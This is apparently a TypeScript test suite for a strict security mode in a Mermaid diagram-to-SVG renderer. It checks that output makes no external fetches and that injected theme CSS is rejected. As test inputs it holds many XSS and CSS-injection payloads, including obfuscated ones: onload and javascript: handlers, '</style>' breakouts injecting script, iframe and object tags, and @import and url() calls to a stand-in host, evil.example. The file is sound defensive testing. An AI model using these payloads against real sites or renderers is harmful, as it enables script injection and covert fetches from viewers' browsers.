// Loop 11 M3 (#7645/#7695): strict security mode — no external fetch in
// agent-generated diagram output.

import { describe, test, expect } from 'bun:test'
import { renderMermaidSVG, verifyNoExternalRefs } from '../index.ts'

describe('#7645/#7695 strict security mode', () => {
  test('strict mode SVG has zero external-fetch references', () => {
    const svg = renderMermaidSVG('flowchart TD\n A[Start] --> B[End]', { security: 'strict' })
    expect(verifyNoExternalRefs(svg)).toEqual({ ok: true, refs: [] })
  })

  test('default mode still emits the Google Fonts @import (back-compat)', () => {
    const svg = renderMermaidSVG('flowchart TD\n A --> B')
    const v = verifyNoExternalRefs(svg)
    expect(v.ok).toBe(false)
    expect(v.refs.some(r => r.includes('fonts.googleapis.com'))).toBe(true)
  })

  test('strict mode preserves the --font CSS variable (family still declared)', () => {
    const svg = renderMermaidSVG('flowchart TD\n A --> B', { security: 'strict' })
    expect(svg).toContain('--font')
  })

  test('rejects style and root-paint values that can break out of CSS or SVG attributes', () => {
    expect(() => renderMermaidSVG('flowchart TD\n A --> B', {
      security: 'strict',
      style: { font: 'Inter\" onload=\"alert(1)' },
    })).toThrow('safe non-fetching CSS font family')
    expect(() => renderMermaidSVG('flowchart TD\n A --> B', {
      security: 'strict',
      bg: '#fff\" onload=\"alert(1)',
    })).toThrow('safe non-fetching CSS color')
  })

  test('keeps safe brand font stacks and custom-property paint references', () => {
    const svg = renderMermaidSVG('flowchart TD\n A --> B', {
      security: 'strict',
      style: { font: "'Acme Sans', Inter, system-ui" },
      bg: 'var(--brand-bg, #fff)',
    })
    expect(svg).toContain("--font:'Acme Sans', Inter, system-ui")
    expect(svg).toContain('--bg:var(--brand-bg, #fff)')
    expect(verifyNoExternalRefs(svg)).toEqual({ ok: true, refs: [] })
  })

  test('strict mode strips external refs from user theme/config values', () => {
    const flow = renderMermaidSVG('flowchart TD\n A --> B', {
      security: 'strict',
      mermaidConfig: { themeVariables: { primaryColor: 'url(https://evil.example/fill.svg)', secondaryColor: 'url(javascript:alert(1))' } } as any,
    })
    expect(flow).not.toContain('https://evil.example')
    expect(flow).not.toMatch(/javascript\s*:/i)
    expect(verifyNoExternalRefs(flow)).toEqual({ ok: true, refs: [] })

    expect(() => renderMermaidSVG(`---
config:
  themeCSS: |
    @import url(https://evil.example/x.css);
    @import "HTTPS://evil.example/no-semi.css"
    @import/**/"//evil.example/comment.css"
    .xychart-title { fill: url(" //evil.example/fill.svg"); }
    .xychart-bar { fill: url(/**///evil.example/comment-fill.svg); stroke: \\75\\72\\6c(//evil.example/escaped.svg); }
    .xychart-label { fill: ur\\l(https://evil.example/simple-escape.svg); }
---
xychart
  title Revenue
  bar [10, 20]`, { security: 'strict' })).toThrow('Raw Mermaid themeCSS is not allowed in strict security mode')
  })

  test('strict mode rejects CSS fetches without protocol slashes and relative fetches', () => {
    expect(() => renderMermaidSVG(`---
config:
  themeCSS: |
    </style><style>
    body { background-image: url(http:evil.example/theme-probe); }
    .xychart-bar { fill: url(/root-relative.svg); stroke: url(relative.svg); }
---
xychart
  bar [10, 20]`, { security: 'strict' })).toThrow('Raw Mermaid themeCSS is not allowed in strict security mode')

    expect(verifyNoExternalRefs('<svg><style>rect{fill:url(http:evil.example/x)}</style></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><style>rect{fill:url(relative.svg)}</style></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><style>body{background:image-set("http:evil.example/x" 1x)}</style></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="url(#local-gradient)"/></svg>').ok).toBe(true)
    expect(verifyNoExternalRefs('<svg><text>label url(relative.svg)</text></svg>').ok).toBe(true)
  })

  test('strict mode rejects even non-fetching raw themeCSS so selectors cannot escape into the host page', () => {
    expect(() => renderMermaidSVG(`---
config:
  themeCSS: |
    body { display: none !important; }
---
xychart
  bar [1, 2]`, { security: 'strict' })).toThrow('Raw Mermaid themeCSS is not allowed in strict security mode')
  })

  test('strict validation preserves authored CSS-like text instead of rewriting the XML', () => {
    const source = 'flowchart TD\n  A["\\41"]'
    const ordinary = renderMermaidSVG(source, { embedFontImport: false })
    const strict = renderMermaidSVG(source, { security: 'strict' })
    expect(strict).toContain('\\41')
    expect(strict).toBe(ordinary)
    expect(() => verifyNoExternalRefs('<svg><script><script>x</script></script><rect/></svg>')).not.toThrow()
    expect(() => renderMermaidSVG(`---
config:
  themeCSS: </style><script>x</script><style>
---
xychart
  bar [1]`, { security: 'strict' })).toThrow('themeCSS is not allowed in strict security mode')
  })

  test('all modes reject active-content tags injected through raw themeCSS', () => {
    const source = `---
config:
  themeCSS: |
    </style><script src="//evil.example/x.js"/><svg:script xmlns:svg="http://www.w3.org/2000/svg">alert(1)</svg:script><_:script xmlns:_="http://www.w3.org/2000/svg">alert(1)</_:script><é:script xmlns:é="http://www.w3.org/2000/svg">alert(1)</é:script><foreignObject/><object data="//evil.example/x"></object><embed src="//evil.example/e"/><iframe src="//evil.example/i"></iframe><use xl:href="//evil.example/s.svg#x" xmlns:xl="http://www.w3.org/1999/xlink"/><use href="https:&amp;#x2f;&amp;#x2f;evil.example/entity.svg#x"/><rect onload="alert(1)"/><a href=//evil.example/x>bad</a><a href=" //evil.example/spaced">bad</a><a onclick='alert(2)' href="javascript:alert(3)">x</a>
---
xychart
  bar [10, 20]`
    expect(() => renderMermaidSVG(source)).toThrow('themeCSS is not allowed in default security mode')
    expect(() => renderMermaidSVG(source, { security: 'strict' })).toThrow('themeCSS is not allowed in strict security mode')
  })

  test('strict mode works across families', () => {
    for (const src of [
      'sequenceDiagram\n A->>B: hi',
      'classDiagram\n A <|-- B',
      'erDiagram\n A ||--o{ B : x',
      'stateDiagram-v2\n [*] --> S',
    ]) {
      const svg = renderMermaidSVG(src, { security: 'strict' })
      expect(verifyNoExternalRefs(svg).ok).toBe(true)
    }
  })

  test('xmlns namespace declaration is NOT flagged as an external ref', () => {
    // The SVG always carries xmlns="http://www.w3.org/2000/svg" — a declaration,
    // not a fetch. verifyNoExternalRefs must not flag it.
    const svg = renderMermaidSVG('flowchart TD\n A --> B', { security: 'strict' })
    expect(svg).toContain('xmlns="http://www.w3.org/2000/svg"')
    expect(verifyNoExternalRefs(svg).ok).toBe(true)
  })

  test('verifyNoExternalRefs flags an @import', () => {
    const v = verifyNoExternalRefs('<svg><style>@import url(https://evil.example/x.css);</style></svg>')
    expect(v.ok).toBe(false)
    expect(v.refs.length).toBeGreaterThan(0)
  })

  test('verifyNoExternalRefs flags <image>, active tags, http href', () => {
    expect(verifyNoExternalRefs('<svg><image href="https://x/y.png"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><script>fetch("//x")</script></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><svg:script xmlns:svg="http://www.w3.org/2000/svg">x</svg:script></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><_:script xmlns:_="http://www.w3.org/2000/svg">x</_:script></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><é:script xmlns:é="http://www.w3.org/2000/svg">x</é:script></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><object data="//x"></object></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><embed src="//x"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><iframe src="//x"></iframe></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><a href="https://x">t</a></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><a href=//x>t</a></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><a href=" //x">t</a></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="url(//x/y.svg)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="url( //x/y.svg)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="url(javascript:alert(1))"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><style>@import url(javascript:alert(1));</style></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><style>@import "HTTPS://evil.example/x.css"</style></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><style>@import/**/"//evil.example/x.css"</style></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="url(/**///evil.example/x.svg)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="\\75\\72\\6c(//evil.example/x.svg)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="ur\\l(https://evil.example/x.svg)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><use xl:href="//evil.example/s.svg#x" xmlns:xl="http://www.w3.org/1999/xlink"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><use href="https:&#x2f;&#x2f;evil.example/s.svg#x"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><use href="https:&amp;#x2f;&amp;#x2f;evil.example/s.svg#x"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect onload="alert(1)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><a href="javascript:alert(1)">x</a></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><a href="javascript&amp;#x3a;alert(1)">x</a></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><a href="data&amp;#x3a;text/html,x">x</a></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><animate attributeName="href" values="#safe;javascript&amp;#x3a;alert(1)"/></svg>').ok).toBe(false)
  })

  test('strict mode rejects entity-obfuscated active URLs and SVG animation sinks', () => {
    expect(() => renderMermaidSVG(`---
config:
  themeCSS: |
    </style><a href="javascript&amp;#x3a;alert(1)">X</a><animate attributeName="href" values="#safe;javascript&amp;#x3a;alert(2)"/><style>
---
xychart
  bar [10, 20]`, { security: 'strict' })).toThrow('Raw Mermaid themeCSS is not allowed in strict security mode')
  })

  test('a clean inline SVG passes', () => {
    expect(verifyNoExternalRefs('<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>')).toEqual({ ok: true, refs: [] })
  })
})
